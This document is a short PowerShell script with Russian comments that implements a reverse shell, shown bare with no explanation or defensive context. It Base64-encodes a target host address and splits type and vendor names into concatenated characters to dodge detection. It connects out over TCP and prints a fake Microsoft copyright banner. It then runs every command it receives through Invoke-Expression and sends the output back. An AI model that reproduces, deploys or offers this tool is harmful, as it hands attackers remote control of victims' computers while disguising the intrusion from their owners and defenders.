$X1 = "M" + "i" + "c" + "r" + "o" + "s" + "o" + "f" + "t"
$X2 = "C" + "o" + "r" + "p" + "o" + "r" + "a" + "t" + "i" + "o" + "n"
$X3 = "All rights reserved."

$H = [Convert]::FromBase64String("MTkyLjE2OC42MC41MA==") # Base64 для "192.168.60.50"
$P = 1337

$T = New-Object ("S" + "y" + "stem.Net.Sockets.TCPClient") ([System.Text.Encoding]::UTF8.GetString($H), $P)
$S = $T.GetStream()

$B1 = ([Text.Encoding]::UTF8).GetBytes("($X1 $X2. $X3)`n`n")
$S.Write($B1, 0, $B1.Length)

$C = ([Text.Encoding]::UTF8).GetBytes((Get-Location).Path + ">")
$S.Write($C, 0, $C.Length)

[byte[]]$D = 0..65535 | % { 0 }
while (($E = $S.Read($D, 0, $D.Length)) -ne 0) {
    $CMD = ([Text.Encoding]::UTF8).GetString($D, 0, $E)
    $R = (iex $CMD 2>&1 | Out-String)
    $R2 = $R + (pwd).Path + "> "
    $B2 = ([Text.Encoding]::UTF8).GetBytes($R2)
    $S.Write($B2, 0, $B2.Length)
    $S.Flush()
}

$T.Close()

